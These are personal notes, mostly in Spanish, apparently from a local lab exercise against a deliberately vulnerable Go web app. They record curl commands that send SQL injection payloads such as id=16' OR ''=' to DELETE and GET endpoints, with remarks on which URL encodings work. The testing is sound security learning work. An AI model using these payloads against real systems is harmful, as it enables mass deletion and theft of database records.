# Notes

TABLA

    docker exec -it go-vulnerable-db psql -U user -d mydatabase

- DELETE

curl -k -X DELETE "http://localhost:8080/instruments/vulnerable-sqli?id=16' OR ''='"    NO FUNCIONA

curl -k -X DELETE "http://localhost:8081/instruments/vulnerable-sqli?id=16'OR''='"    SI FUNCIONA

    curl -k -X DELETE "https://localhost:8080/instruments/vulnerable-sqli?id=3%27%20OR%20%27%27=%27"    SI FUNCIONA



curl -k -X DELETE "http://localhost:8080/instruments/vulnerable-sqli?id=3\' OR \'\'=\'"  NO FUNCIONA

curl -k -X DELETE 'http://localhost:8080/instruments/vulnerable-sqli?id=3'\'' OR '\'''\''='\'  NO FUNCIONA


> El parámetro --data-urlencode hace automáticamente la codificación URL por ti, así que no tienes que preocuparte por escribir %27, %20, etc.

curl -k -X DELETE -G "http://localhost:8080/instruments/vulnerable-sqli" \
  --data-urlencode "id=3' OR ''='"   SI FUNCIONA



- GET

curl -X GET "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16"


curl -k -X GET "https://localhost:8081/instruments/vulnerable-sqligetinst?id=16%27%20OR%20%27%27=%27"  (RECUPERA TODAS LAS FILAS)


curl -k -GET "http://localhost:8081/instruments/vulnerable-sqligetinst" \
  --data-urlencode "id=16' OR ''='"


curl "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16' OR ''='" NO FUNCIONA POR LOS ESPACIOS

curl "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16'OR''='" SI FUNCIONA


curl "http://localhost:8081/instruments/vulnerable-sqligetinst?id=16'+OR+''='" SI FUNCIONA

**Con Curl funciona con el payload codificado con parametro o codificacion manual.**
**Recordar que eran los espacios**

